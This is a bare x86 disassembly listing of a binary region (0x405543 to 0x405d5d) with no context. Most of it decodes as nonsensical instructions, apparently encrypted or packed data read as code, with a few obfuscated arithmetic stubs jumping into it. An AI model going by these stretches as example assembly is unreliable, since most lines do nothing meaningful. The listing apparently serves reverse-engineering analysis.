  405543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405544:	scas   eax,DWORD PTR es:[edi]
  405545:	xor    esp,eax
  405547:	es inc ebx
  405549:	pop    ebp
  40554a:	cmp    al,0xdb
  40554c:	cmp    edi,DWORD PTR [ebx]
  40554e:	test   BYTE PTR [eax+ebp*4],bl
  405551:	push   0xd7b7bd9d
  405556:	push   0x7523eb08
  40555b:	xor    esp,edi
  40555d:	rcl    DWORD PTR [eax],cl
  40555f:	into   
  405560:	mov    edx,DWORD PTR [edx+0x708ab923]
  405566:	push   ecx
  405567:	outs   dx,BYTE PTR ds:[esi]
  405568:	aam    0x33
  40556a:	jno    0x4055a6
  40556c:	adc    cl,bh
  40556e:	test   DWORD PTR [edi-0x25],edi
  405571:	mov    ecx,0x4ad9398a
  405576:	ror    DWORD PTR [eax],1
  405578:	add    eax,DWORD PTR [ecx+0xe]
  40557b:	lock sbb DWORD PTR [esi],ebx
  40557e:	scas   al,BYTE PTR es:[edi]
  40557f:	fdiv   QWORD PTR [ebx-0x35]
  405582:	gs dec edx
  405584:	fisubr DWORD PTR [ecx+0x78411ba]
  40558a:	adc    edi,esp
  40558c:	adc    edx,DWORD PTR [ecx+0x3a]
  40558f:	inc    edx
  405590:	xchg   edi,eax
  405591:	add    ecx,DWORD PTR [ebx+edi*8]
  405594:	jbe    0x4055fa
  405596:	and    DWORD PTR [edi],ecx
  405598:	mov    ds:0xf12d0277,eax
  40559d:	add    al,0x4a
  40559f:	sbb    al,0x5e
  4055a1:	sbb    eax,0x3a4a2dc6
  4055a6:	inc    edx
  4055a7:	jne    0x4055c7
  4055a9:	loope  0x40555e
  4055ab:	sub    edx,DWORD PTR [esi+0x79]
  4055ae:	xchg   esp,eax
  4055af:	cbw    
  4055b1:	mov    edx,0x719acc0e
  4055b6:	sbb    bh,BYTE PTR [esi+0x5be89a72]
  4055bc:	jl     0x4055eb
  4055be:	leave  
  4055bf:	mov    ecx,0xe98b9c5a
  4055c4:	cdq    
  4055c5:	pop    edi
  4055c6:	ds jge 0x4055f5
  4055c9:	daa    
  4055ca:	iret   
  4055cb:	mov    edx,DWORD PTR [ebp+0x2e]
  4055ce:	lahf   
  4055cf:	adc    edx,DWORD PTR [esi+0x267269c3]
  4055d5:	dec    esi
  4055d6:	xor    eax,0xc1808395
  4055db:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4055dd:	out    dx,al
  4055de:	es xchg edi,eax
  4055e0:	std    
  4055e1:	jno    0x405625
  4055e3:	sbb    eax,0x181715ca
  4055e8:	aaa    
  4055e9:	mov    ah,0x72
  4055eb:	lods   eax,DWORD PTR ds:[esi]
  4055ec:	adc    ebx,DWORD PTR [edx]
  4055ee:	lock sub ch,BYTE PTR [ebp-0x15]
  4055f2:	popf   
  4055f3:	or     DWORD PTR [edx],0xa
  4055f6:	and    bl,BYTE PTR [edx-0x10af3bb2]
  4055fc:	in     al,dx
  4055fd:	cwde   
  4055fe:	psrad  mm5,mm7
  405601:	mov    ch,0x6b
  405603:	push   edx
  405604:	or     cl,BYTE PTR [ebx]
  405606:	cld    
  405607:	lds    edx,FWORD PTR [ebx-0x3d]
  40560a:	or     eax,0xa224ad76
  40560f:	into   
  405610:	jae    0x4055fd
  405612:	push   es
  405613:	bound  eax,QWORD PTR [edi+0x2b]
  405616:	fcom   QWORD PTR [ebx-0x4e]
  405619:	jecxz  0x405667
  40561b:	test   DWORD PTR [edi],0xc18b98c8
  405621:	rcl    DWORD PTR [edx+edx*8-0x721a81ca],0xf4
  405629:	or     esi,eax
  40562b:	clc    
  40562c:	enter  0xf614,0xf4
  405630:	sti    
  405631:	or     edi,DWORD PTR [ebx-0x26732aa0]
  405637:	push   es
  405638:	mov    ebx,0xef765b2e
  40563d:	mov    DWORD PTR [bx+di-0xb7a],esp
  405642:	push   ebx
  405643:	and    DWORD PTR [ebx],0x83376a81
  405649:	add    BYTE PTR [ebx],0xfd
  40564c:	sbb    BYTE PTR [esi+0x41],cl
  40564f:	lock or eax,0xee061b7
  405655:	bound  ebx,QWORD PTR [eax]
  405657:	jnp    0x405688
  405659:	xor    DWORD PTR [esp+eiz*4-0x41e67b9a],edx
  405660:	dec    esi
  405661:	mov    eax,ds:0x43db7d75
  405666:	mov    esp,0xa52cc388
  40566b:	mov    ebx,ecx
  40566d:	jmp    0x7b0d7cdb
  405672:	push   ss
  405673:	aas    
  405674:	adc    ebp,edi
  405676:	(bad)  
  405677:	in     al,dx
  405678:	sub    bl,BYTE PTR [edx-0x29]
  40567b:	mov    ds:0xb7d318e5,al
  405680:	jbe    0x40567a
  405682:	mov    ?,esi
  405684:	inc    ebp
  405685:	ret    
  405686:	mov    cl,0xfc
  405688:	and    eax,0x420b7d16
  40568d:	test   BYTE PTR [edi+0x35],ch
  405690:	mov    edi,ebp
  405692:	mov    dl,BYTE PTR [bp+di]
  405695:	or     dh,BYTE PTR [eax+0x68]
  405698:	xchg   DWORD PTR [edi],ecx
  40569a:	and    BYTE PTR [esi+0x3f],ch
  40569d:	pusha  
  40569e:	js     0x405684
  4056a0:	add    ah,BYTE PTR [ebp+0x2]
  4056a3:	mov    ebx,cs
  4056a5:	rol    esi,0x28
  4056a8:	xlat   BYTE PTR ds:[ebx]
  4056a9:	add    al,0x5a
  4056ac:	adc    al,0x26
  4056ae:	push   esi
  4056af:	mov    bl,BYTE PTR [esi]
  4056b1:	adc    eax,0x5265ac18
  4056b6:	dec    ecx
  4056b7:	push   eax
  4056b8:	aas    
  4056b9:	outs   dx,DWORD PTR ds:[esi]
  4056ba:	fisubr WORD PTR [edx+0x3c]
  4056bd:	jp     0x4056dd
  4056bf:	or     DWORD PTR [ecx+0xf],eax
  4056c2:	out    dx,al
  4056c3:	ins    BYTE PTR es:[edi],dx
  4056c4:	push   ebp
  4056c5:	pop    ebx
  4056c6:	pop    edx
  4056c7:	push   ss
  4056c8:	ret    0xbcd1
  4056cb:	loop   0x405719
  4056cd:	fwait
  4056ce:	mov    dh,BYTE PTR [ebx+0x6234098a]
  4056d4:	mov    eax,0xcc538ffe
  4056d9:	iret   
  4056da:	pop    ds
  4056db:	mov    edx,0xb75df167
  4056e0:	sub    ebp,DWORD PTR [eax-0x21254bf4]
  4056e6:	jae    0x4056ec
  4056e8:	popa   
  4056e9:	mov    eax,ds:0xe435242c
  4056ee:	push   0xb8bcae9b
  4056f3:	inc    esp
  4056f4:	ins    DWORD PTR es:[edi],dx
  4056f5:	sbb    cl,BYTE PTR [edx]
  4056f7:	call   0x5441f128
  4056fc:	sub    al,0x32
  4056fe:	xor    eax,0xecff3b45
  405703:	xchg   edi,eax
  405704:	pop    edi
  405705:	in     eax,dx
  405706:	or     BYTE PTR ds:0x2f2145fc,0x0
  40570d:	iret   
  40570e:	inc    ebp
  40570f:	cmp    edi,ebx
  405711:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405712:	or     bl,BYTE PTR [edi]
  405714:	push   ecx
  405715:	push   ss
  405716:	cwde   
  405717:	outs   dx,BYTE PTR ds:[esi]
  405718:	shr    DWORD PTR [esi-0x4cddcab1],0x1c
  40571f:	inc    esi
  405720:	out    dx,al
  405721:	fs dec ebp
  405723:	out    dx,eax
  405724:	test   BYTE PTR gs:[ecx+edi*1+0x33],al
  405729:	adc    esp,esp
  40572b:	imul   edx,DWORD PTR [ebx+ecx*4+0x59],0xffffffbd
  405730:	xor    bl,al
  405732:	or     BYTE PTR [eax+0x2b0885cd],dh
  405738:	jns    0x40573c
  40573a:	fs (bad) 
  40573e:	push   esi
  40573f:	dec    edx
  405740:	ret    
  405741:	stos   BYTE PTR es:[edi],al
  405742:	mov    BYTE PTR [eax],cl
  405744:	adc    eax,0x3635374f
  405749:	cmp    al,0xee
  40574b:	and    eax,0x70386dc9
  405750:	arpl   WORD PTR [ebx],di
  405752:	inc    esi
  405753:	ds scas eax,DWORD PTR es:[edi]
  405755:	sub    DWORD PTR [eax+0x1a],esi
  405758:	cmp    BYTE PTR [eax+0xb],0xc7
  40575c:	fild   QWORD PTR [edx+eax*4+0x73]
  405760:	scas   al,BYTE PTR es:[edi]
  405761:	fimul  WORD PTR [ebx-0x3d]
  405764:	cmp    ecx,DWORD PTR [ecx-0x36ddf9c]
  40576a:	scas   al,BYTE PTR es:[edi]
  40576b:	sub    eax,0x313cc87b
  405770:	push   ecx
  405771:	push   esp
  405772:	lods   al,BYTE PTR ds:[esi]
  405773:	and    ecx,DWORD PTR [ebp+0x7]
  405776:	adc    dl,ch
  405778:	ficom  DWORD PTR [edx+0x19afd052]
  40577e:	ins    BYTE PTR es:[edi],dx
  40577f:	mov    ah,0x9b
  405781:	(bad)  
  405782:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405783:	retf   0x570d
  405786:	in     eax,dx
  405787:	add    bl,bl
  405789:	mov    WORD PTR [edi-0x1e],ds
  40578c:	fdiv   QWORD PTR [edi+ecx*1+0x5337b830]
  405793:	loopne 0x40572d
  405795:	stc    
  405796:	jae    0x405787
  405798:	mov    WORD PTR [edi+0x4bc94c6c],ss
  40579e:	jb     0x4057d5
  4057a0:	das    
  4057a1:	daa    
  4057a2:	xor    eax,edx
  4057a4:	add    edi,eax
  4057a6:	push   edx
  4057a7:	push   es
  4057a8:	pop    ecx
  4057a9:	mov    eax,ds:0x5469b16d
  4057ae:	fisub  WORD PTR [edi-0x17]
  4057b1:	mov    BYTE PTR [eax+0x3a],ch
  4057b4:	mov    bh,0xc9
  4057b6:	(bad)  
  4057b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b8:	jb     0x4057b9
  4057ba:	es test dl,cl
  4057bd:	(bad)  
  4057be:	pop    edx
  4057bf:	icebp  
  4057c0:	in     eax,dx
  4057c1:	and    eax,0xec596017
  4057c6:	ret    0xac17
  4057c9:	out    dx,eax
  4057ca:	imul   ecx,DWORD PTR [esi+0x1b7fea5a],0x5b
  4057d1:	out    dx,al
  4057d2:	pop    ebp
  4057d3:	mov    eax,0xbd36ccf9
  4057d8:	fs pop esi
  4057da:	bound  ebp,QWORD PTR [eax]
  4057dc:	(bad)  
  4057de:	(bad)  
  4057df:	jbe    0x4057e7
  4057e1:	imul   edi,edi,0xfea6d73c
  4057e7:	mov    al,0x41
  4057e9:	sbb    DWORD PTR [edi-0x71688095],ebx
  4057ef:	test   BYTE PTR [ebx-0x32179f50],bh
  4057f5:	cmp    bl,bh
  4057f7:	sbb    BYTE PTR ds:0xaf2fd4c3,ch
  4057fd:	div    BYTE PTR [esi-0x2f]
  405800:	sub    eax,DWORD PTR [esi-0xd]
  405803:	jp     0x4057d8
  405805:	sbb    al,0xf3
  405807:	jmp    0x9128:0x8a5bc68f
  40580e:	jecxz  0x405856
  405810:	mov    eax,ds:0x3e42b34e
  405816:	icebp  
  405817:	mov    ah,bh
  405819:	fisttp WORD PTR [ecx]
  40581b:	xlat   BYTE PTR ds:[ebx]
  40581c:	dec    BYTE PTR [eax-0x62ee3b30]
  405822:	push   0xffffffac
  405824:	or     al,ah
  405826:	gs leave 
  405828:	cwde   
  405829:	rcr    BYTE PTR [ebx+0xf],1
  40582c:	add    eax,0x6824ea6b
  405831:	repz es xchg ebx,eax
  405834:	out    dx,eax
  405835:	pop    esp
  405836:	dec    ebp
  405837:	sbb    al,0x37
  405839:	sti    
  40583a:	mov    edx,DWORD PTR [esi+0x4]
  40583d:	neg    DWORD PTR ds:0x4283cb
  405843:	mov    DWORD PTR [ebp-0x2c],ecx
  405846:	cmp    DWORD PTR ds:0x4281b7,0x0
  40584d:	mov    DWORD PTR ds:0x4282a7,0x540
  405857:	mov    ecx,0x427
  40585c:	mov    edx,0x7aa7
  405861:	jmp    0x4058af
  405866:	mov    ecx,0x6abc
  40586b:	mov    DWORD PTR ds:0x4282a7,0x2ac5
  405875:	cmp    DWORD PTR ds:0x4281b7,0x0
  40587c:	jb     0x40589d
  405882:	push   0x1050
  405887:	call   DWORD PTR ds:0x428eb4
  40588d:	adc    DWORD PTR ds:0x42834b,edx
  405893:	or     DWORD PTR ds:0x42827b,0x369f
  40589d:	neg    DWORD PTR ds:0x4281bb
  4058a3:	sub    DWORD PTR ds:0x42819b,edi
  4058a9:	sub    edx,0xfd0
  4058af:	mov    ecx,DWORD PTR [ebp+0x18]
  4058b2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058b5:	shrd   ecx,edx,0x2
  4058b9:	shr    edx,0x2
  4058bc:	mov    DWORD PTR [ebp-0x1c],ecx
  4058bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4058c2:	mov    edx,DWORD PTR [ebp+0x1c]
  4058c5:	xor    DWORD PTR [ebp-0x1c],edi
  4058c8:	xor    edx,edx
  4058ca:	or     edx,DWORD PTR [ebp-0x1c]
  4058cd:	shl    ecx,0x1e
  4058d0:	add    edx,DWORD PTR [ebp-0x2c]
  4058d3:	add    DWORD PTR [eax],edx
  4058d5:	mov    eax,DWORD PTR [esi]
  4058d7:	mov    ecx,DWORD PTR [esi+0x4]
  4058da:	shrd   eax,ecx,0x2
  4058de:	shr    ecx,0x2
  4058e1:	mov    ecx,DWORD PTR [esi]
  4058e3:	mov    edx,DWORD PTR [esi+0x4]
  4058e6:	xor    eax,edi
  4058e8:	shl    ecx,0x1e
  4058eb:	xor    edx,edx
  4058ed:	or     edx,eax
  4058ef:	mov    DWORD PTR [ebp-0x4],edx
  4058f2:	mov    DWORD PTR [ebp-0x30],0xca79a575
  4058f9:	mov    eax,0x9c1b89e8
  4058fe:	jmp    0x405cdc
  405903:	ret    
  405904:	scas   eax,DWORD PTR es:[edi]
  405905:	sar    ebx,0x9d
  405908:	fcmovb st,st(2)
  40590a:	scas   al,BYTE PTR es:[edi]
  40590b:	mov    dl,0xbd
  40590d:	(bad)  
  40590e:	jl     0x405948
  405910:	call   0xb1ae0982
  405915:	sbb    BYTE PTR [eax],bl
  405917:	sahf   
  405918:	adc    bl,BYTE PTR [eax]
  40591a:	sbb    BYTE PTR [ecx+0x1e],al
  40591d:	popa   
  40591e:	das    
  40591f:	(bad)  
  405920:	pop    edx
  405921:	in     al,0x58
  405923:	and    al,0x72
  405925:	mov    WORD PTR [ebx+ebx*8],ss
  405928:	mov    ecx,DWORD PTR [edx+0x1e]
  40592b:	jns    0x4058f7
  40592d:	add    eax,0xb18b37e1
  405932:	fcomp  DWORD PTR [ecx]
  405934:	push   esp
  405935:	mov    ah,0x5b
  405937:	jo     0x4058e7
  405939:	ja     0x405968
  40593b:	test   DWORD PTR [ebx+eiz*4-0x5348bc4e],edi
  405942:	push   DWORD PTR [eax]
  405944:	bound  esi,QWORD PTR [ecx-0x1f]
  405947:	mov    eax,0x4cc443f4
  40594c:	scas   al,BYTE PTR es:[edi]
  40594d:	add    ebx,DWORD PTR [esi+eiz*4+0x36cb9cd0]
  405954:	mov    ecx,0x457fbb78
  405959:	stc    
  40595a:	ss nop
  40595c:	(bad)  
  40595d:	sti    
  40595e:	fsubr  st,st(1)
  405960:	clc    
  405961:	sbb    eax,0x68d4033a
  405966:	dec    esi
  405967:	(bad)  
  405968:	sti    
  405969:	jmp    0x405962
  40596b:	mov    ch,0xf3
  40596d:	fdiv   QWORD PTR [ebx]
  40596f:	add    dl,BYTE PTR [edx-0x4e]
  405972:	cld    
  405973:	js     0x4059af
  405975:	cmp    dl,BYTE PTR [ebx+edi*8+0x1f4087fb]
  40597c:	es push es
  40597e:	cmp    bl,dl
  405980:	xchg   edi,eax
  405981:	out    dx,al
  405982:	xchg   BYTE PTR [eax+0x494cb559],ch
  405988:	dec    esi
  405989:	pushf  
  40598a:	mov    edx,0x1172c7a
  40598f:	fnstenv [ecx+0x74410e04]
  405995:	mov    al,0xc7
  405997:	sub    esi,DWORD PTR [eax+0x33]
  40599a:	sbb    BYTE PTR [esi+0x45ee539b],ch
  4059a0:	fst    DWORD PTR [eax]
  4059a2:	fwait
  4059a3:	lahf   
  4059a4:	in     al,dx
  4059a5:	cdq    
  4059a6:	imul   esi,DWORD PTR [edx+ebp*4-0x6f],0xffffffdc
  4059ab:	push   ss
  4059ac:	inc    edx
  4059ad:	and    dl,BYTE PTR [ecx-0x7c4c66d8]
  4059b3:	cmp    BYTE PTR ds:0x4cf6aa1c,ch
  4059b9:	in     al,0xed
  4059bb:	out    0x43,al
  4059bd:	addr16 sbb eax,0xe4ef54b4
  4059c3:	sbb    edx,DWORD PTR [edx-0xc4d8af]
  4059c9:	sub    edx,DWORD PTR [ebp-0x31]
  4059cc:	cmp    eax,0x6d31c0e4
  4059d1:	aam    0xf9
  4059d3:	add    eax,0xc3730487
  4059d8:	or     bh,ah
  4059da:	push   esp
  4059db:	adc    ecx,DWORD PTR [esi+0x4a]
  4059de:	aad    0x84
  4059e0:	cmp    DWORD PTR [ecx+0x2b],eax
  4059e3:	out    dx,al
  4059e4:	and    DWORD PTR [eax],ebx
  4059e6:	shl    al,0x14
  4059e9:	dec    ebp
  4059ea:	cmp    bh,BYTE PTR [ecx-0x1a]
  4059ed:	xor    DWORD PTR [esp+edi*1+0x3fc4284b],esi
  4059f4:	mov    ebx,0xf9869fce
  4059f9:	call   0xe961:0x7ff18349
  405a00:	cld    
  405a01:	in     al,0x85
  405a03:	repnz test eax,0x590d5c48
  405a09:	sahf   
  405a0a:	fucom  st(7)
  405a0c:	mov    bh,0x81
  405a0e:	fsub   st,st(5)
  405a10:	test   al,0x5d
  405a12:	cmp    eax,DWORD PTR [ecx+0x53dbfc28]
  405a18:	mov    edx,0xed4f117f
  405a1d:	mov    esi,0xe84b3e11
  405a22:	push   ecx
  405a23:	retf   
  405a24:	(bad)  
  405a25:	loop   0x4059e0
  405a27:	(bad)  
  405a28:	xlat   BYTE PTR ds:[ebx]
  405a29:	mov    al,ds:0x520761ec
  405a2e:	ret    
  405a2f:	mov    ebp,0xd474aa3c
  405a34:	mov    ebp,0x9d6dca7
  405a39:	call   0xf4deb941
  405a3e:	int    0x97
  405a40:	or     esi,DWORD PTR [ebp-0x1f]
  405a43:	jne    0x405a96
  405a45:	sbb    dl,al
  405a47:	cmc    
  405a48:	xchg   ebx,eax
  405a49:	cld    
  405a4a:	idiv   BYTE PTR [ecx+esi*4-0x35]
  405a4e:	add    BYTE PTR [edi],al
  405a50:	fsub   QWORD PTR [edi+0x60e7ccfe]
  405a56:	mov    edi,0xb5fc76ef
  405a5b:	ret    
  405a5c:	repz (bad) 
  405a5e:	dec    esi
  405a5f:	fxch   st(4)
  405a61:	iret   
  405a62:	in     al,0xf
  405a64:	adc    eax,0xe355f572
  405a69:	or     BYTE PTR [eax+0x5c],bl
  405a6c:	ret    
  405a6d:	adc    eax,0xa6d5a68e
  405a72:	repnz dec edi
  405a74:	retf   0xfb13
  405a77:	pop    esi
  405a78:	sub    edx,esp
  405a7a:	mov    bl,0x8
  405a7c:	shl    DWORD PTR [ecx+0x3e0d4e87],0xc2
  405a83:	retf   
  405a84:	inc    ebx
  405a85:	fild   DWORD PTR [esi]
  405a87:	ret    0xa1a5
  405a8a:	cmp    bh,BYTE PTR [edi]
  405a8c:	and    DWORD PTR [eax],ecx
  405a8e:	mov    eax,0x9a075a1e
  405a93:	dec    eax
  405a94:	or     BYTE PTR [esi],bh
  405a96:	pop    ecx
  405a97:	push   eax
  405a98:	lods   al,BYTE PTR ds:[esi]
  405a99:	int    0x9e
  405a9b:	xchg   edx,eax
  405a9c:	mov    dl,0xb4
  405a9e:	dec    ebp
  405a9f:	lahf   
  405aa0:	mov    esi,0x5c2b2f3a
  405aa5:	cmp    DWORD PTR [edx],ebx
  405aa7:	push   ecx
  405aa8:	enter  0x31f4,0xa0
  405aac:	leave  
  405aad:	mov    dl,0x78
  405aaf:	iret   
  405ab0:	cmp    DWORD PTR [ebp-0x6f0ada65],0x9f5e60e0
  405aba:	leave  
  405abb:	push   edi
  405abc:	fisttp QWORD PTR [ebx+0xd76be2e]
  405ac2:	pop    edi
  405ac3:	mov    ebp,0xc015bce8
  405ac8:	push   ds
  405ac9:	dec    BYTE PTR [esi-0x62194a65]
  405acf:	jl     0x405a75
  405ad1:	push   esp
  405ad2:	(bad)  
  405ad3:	mov    ah,0x6
  405ad5:	fild   DWORD PTR [esi]
  405ad7:	cmp    BYTE PTR [esi+ebp*8-0x52c10b3f],bh
  405ade:	call   0xbd11:0x51e8509a
  405ae5:	in     eax,dx
  405ae6:	push   ss
  405ae7:	and    BYTE PTR [ecx],dl
  405ae9:	mov    ds:0xbb633158,eax
  405aee:	int3   
  405aef:	mov    bl,0xf8
  405af1:	mov    ss,WORD PTR [eax+eax*1-0x11923c71]
  405af8:	loopne 0x405a80
  405afa:	dec    ecx
  405afb:	adc    eax,0x413b34b0
  405b00:	pushf  
  405b01:	or     eax,0x9e8a6a60
  405b06:	es ja  0x405aaa
  405b09:	push   ss
  405b0a:	mov    cl,0xdb
  405b0c:	jle    0x405af5
  405b0e:	push   ecx
  405b0f:	and    DWORD PTR [ebx],esp
  405b11:	pop    edx
  405b12:	hlt    
  405b13:	imul   DWORD PTR [esi+0x5eabec64]
  405b19:	sti    
  405b1a:	imul   eax,DWORD PTR [eax+ecx*1],0x83fe7fa6
  405b21:	ins    BYTE PTR es:[edi],dx
  405b22:	cmp    ecx,edx
  405b24:	int    0x42
  405b26:	inc    edx
  405b27:	xor    al,0xd2
  405b29:	mov    cl,0x1d
  405b2b:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  405b2d:	and    dl,BYTE PTR ds:0x793658e4
  405b33:	mov    esi,0xbca9030
  405b38:	mov    ds:0x92908ea,eax
  405b3d:	leave  
  405b3e:	or     ebp,DWORD PTR [ecx+0x1eff0275]
  405b44:	out    0xdd,eax
  405b46:	mov    dl,0xc
  405b48:	(bad)  
  405b49:	push   ebx
  405b4a:	inc    ebx
  405b4b:	in     eax,dx
  405b4c:	jmp    0x19e7468c
  405b51:	outs   dx,DWORD PTR ds:[esi]
  405b52:	sub    BYTE PTR [eax],dl
  405b54:	outs   dx,DWORD PTR ds:[esi]
  405b55:	sbb    BYTE PTR [edx-0x3a],al
  405b58:	rol    edi,0x98
  405b5b:	push   ds
  405b5c:	mov    bl,0xec
  405b5e:	inc    edi
  405b5f:	pop    edx
  405b60:	cmp    eax,0x1b75bdb2
  405b65:	jbe    0x405b74
  405b67:	fldcw  WORD PTR [esi+ebp*2]
  405b6a:	int3   
  405b6b:	pop    ecx
  405b6c:	fldenv [ecx+0x1e]
  405b6f:	cdq    
  405b70:	fldcw  WORD PTR [edi]
  405b72:	lods   al,BYTE PTR ds:[esi]
  405b73:	and    edx,ebp
  405b75:	add    dl,0xc1
  405b78:	clc    
  405b79:	jns    0x405bea
  405b7b:	int3   
  405b7c:	push   es
  405b7d:	and    ch,ch
  405b7f:	push   es
  405b80:	dec    ecx
  405b81:	adc    al,0x38
  405b83:	sub    al,0x9b
  405b85:	fbstp  TBYTE PTR [esi+0x3b]
  405b88:	int3   
  405b89:	jbe    0x405b0f
  405b8b:	or     al,0xab
  405b8d:	in     eax,dx
  405b8e:	dec    eax
  405b8f:	sub    eax,DWORD PTR [edx+0x3cbc449d]
  405b95:	outs   dx,DWORD PTR ds:[esi]
  405b96:	jecxz  0x405bd4
  405b98:	cld    
  405b99:	aaa    
  405b9a:	jle    0x405b2a
  405b9c:	imul   esp,edi,0xaed2a999
  405ba2:	loope  0x405b2b
  405ba4:	dec    eax
  405ba5:	in     eax,dx
  405ba6:	call   0xe23b:0xfa2ab17f
  405bad:	stos   BYTE PTR es:[edi],al
  405bae:	or     esi,DWORD PTR [ebp+esi*4+0x1d0610aa]
  405bb5:	push   ebp
  405bb6:	or     BYTE PTR [ecx-0x6e],dh
  405bb9:	jecxz  0x405b49
  405bbb:	sti    
  405bbc:	jmp    0xd9abe2e8
  405bc1:	inc    edx
  405bc2:	or     DWORD PTR [eax+eiz*8-0x4],ebx
  405bc6:	call   0xfeaa:0x39e780f3
  405bcd:	mov    al,ds:0xf809066e
  405bd2:	(bad)  
  405bd3:	xor    al,0xed
  405bd5:	adc    esi,ecx
  405bd7:	sub    BYTE PTR [eax+0x514a2b88],dh
  405bdd:	les    esp,FWORD PTR ds:0x39db5b45
  405be3:	xchg   edi,eax
  405be4:	jae    0x405c0d
  405be6:	or     esi,esi
  405be8:	pop    ds
  405be9:	(bad)  
  405bea:	in     al,dx
  405beb:	add    ecx,ecx
  405bed:	inc    esi
  405bee:	cdq    
  405bef:	dec    esp
  405bf0:	leave  
  405bf1:	test   DWORD PTR [ebp-0x2d168ec7],edx
  405bf7:	(bad)  
  405bf8:	fwait
  405bf9:	jno    0x405c44
  405bfb:	ins    DWORD PTR es:[edi],dx
  405bfc:	sub    bl,BYTE PTR [esi+0x6f4aa749]
  405c02:	xchg   esp,eax
  405c03:	xchg   DWORD PTR [eax+0x252a0e75],eax
  405c09:	xchg   edx,eax
  405c0a:	jmp    0x1e904158
  405c0f:	popf   
  405c10:	push   es
  405c11:	cmp    BYTE PTR [esi-0x24],dh
  405c14:	xchg   DWORD PTR [ebx-0x2fd0305d],ebx
  405c1a:	test   DWORD PTR [ecx+0x73a65ec8],0x81cf0e31
  405c24:	and    eax,0x211b04bd
  405c29:	fld    TBYTE PTR [edi-0x2d88f7da]
  405c2f:	scas   eax,DWORD PTR es:[edi]
  405c30:	sub    DWORD PTR [ecx],eax
  405c32:	sub    DWORD PTR [edi+0x7a],ecx
  405c35:	cs push es
  405c37:	sbb    ebp,DWORD PTR [ecx-0x73]
  405c3a:	push   eax
  405c3b:	rcl    DWORD PTR [edi-0x12],cl
  405c3e:	mov    ecx,0x3d80b244
  405c43:	pop    esp
  405c44:	sbb    dl,BYTE PTR [eax+ebp*4-0x7e]
  405c48:	int    0xd0
  405c4a:	test   DWORD PTR [edi],esp
  405c4c:	and    eax,0x31bd5cf5
  405c51:	mov    edx,0x874d337c
  405c56:	xchg   esp,eax
  405c57:	mov    eax,0x70396c38
  405c5c:	adc    DWORD PTR [ebx+0x2b489ce4],edx
  405c62:	int    0xdc
  405c64:	sub    al,0x58
  405c66:	dec    edx
  405c67:	xchg   edi,eax
  405c68:	jge    0x405c48
  405c6a:	pop    esp
  405c6b:	pop    ebx
  405c6c:	xchg   ebx,eax
  405c6d:	xor    ah,BYTE PTR [ebx+0x45]
  405c70:	xor    ah,BYTE PTR [ebp-0x19]
  405c73:	push   edx
  405c74:	jmp    0xee3b6d99
  405c79:	shr    DWORD PTR [esi],1
  405c7b:	imul   esi,DWORD PTR [ebx+0x402a93be],0x75ee2546
  405c85:	mov    edx,0x7f32a144
  405c8a:	sbb    cl,0xd9
  405c8d:	mov    edx,0x3b5d85c5
  405c92:	nop
  405c93:	jnp    0x405c7a
  405c95:	or     eax,0xc817261a
  405c9a:	inc    edi
  405c9b:	call   0x9285:0x6ab51ae5
  405ca2:	pop    edx
  405ca3:	in     eax,0xcd
  405ca5:	es xchg ebx,eax
  405ca7:	fisttp QWORD PTR [ecx]
  405ca9:	jg     0x405cb1
  405cab:	fst    st(6)
  405cad:	fwait
  405cae:	push   0x82fedd3b
  405cb3:	lahf   
  405cb4:	mov    dh,0x29
  405cb6:	into   
  405cb7:	xchg   esi,eax
  405cb8:	(bad)  
  405cb9:	fbstp  TBYTE PTR [eax]
  405cbb:	nop
  405cbc:	mov    DWORD PTR [ecx],edx
  405cbe:	xchg   BYTE PTR [esi-0x741c734f],bl
  405cc4:	test   eax,0x3bdbe81e
  405cc9:	cmp    ebp,DWORD PTR [eax+0x9]
  405ccc:	fist   WORD PTR [edi-0x6d]
  405ccf:	addr16 jmp 0x405c8d
  405cd2:	icebp  
  405cd3:	add    DWORD PTR [edi],ebx
  405cd5:	sbb    al,0x80
  405cd7:	pop    ebp
  405cd8:	inc    edi
  405cd9:	or     esp,ebx
  405cdb:	jns    0x46083126
  405ce1:	loopne 0x405d54
  405ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce4:	jns    0x405cb0
  405ce6:	mov    DWORD PTR [ebp-0x1c],eax
  405ce9:	mov    DWORD PTR [ebp-0x10],0xca79a57d
  405cf0:	mov    DWORD PTR [ebp-0xc],eax
  405cf3:	mov    DWORD PTR [ebp-0x60],0xca79a579
  405cfa:	mov    DWORD PTR [ebp-0x5c],eax
  405cfd:	mov    eax,DWORD PTR [ebp-0x30]
  405d00:	mov    ecx,DWORD PTR [ebp-0x2c]
  405d03:	shrd   eax,ecx,0x2
  405d07:	shr    ecx,0x2
  405d0a:	mov    ecx,DWORD PTR [ebp-0x30]
  405d0d:	mov    edx,DWORD PTR [ebp-0x2c]
  405d10:	xor    eax,edi
  405d12:	shl    ecx,0x1e
  405d15:	xor    edx,edx
  405d17:	or     eax,edx
  405d19:	jmp    0x4060f7
  405d1e:	cmp    ebp,DWORD PTR [ecx+0x3e]
  405d21:	lock sbb ch,BYTE PTR [esi+0x62d8231a]
  405d28:	shl    DWORD PTR [eax-0x72],1
  405d2b:	iret   
  405d2c:	arpl   WORD PTR [edx+esi*8-0x61e7e757],di
  405d33:	adc    bl,BYTE PTR [eax]
  405d35:	sbb    BYTE PTR [eax+0x1df4506],ch
  405d3b:	hlt    
  405d3c:	mov    ds:0xb34e8fa7,eax
  405d41:	aas    
  405d42:	mov    edi,0x14077189
  405d47:	in     al,dx
  405d48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4a:	les    edi,FWORD PTR ds:[ecx+eax*8]
  405d4e:	test   al,0x90
  405d50:	mov    ?,eax
  405d52:	dec    esi
  405d53:	les    ecx,FWORD PTR [edi]
  405d55:	push   ss
  405d56:	adc    al,0x7e
  405d58:	mov    ds:0x7cc4a2bd,al
  405d5d:	dec    eax
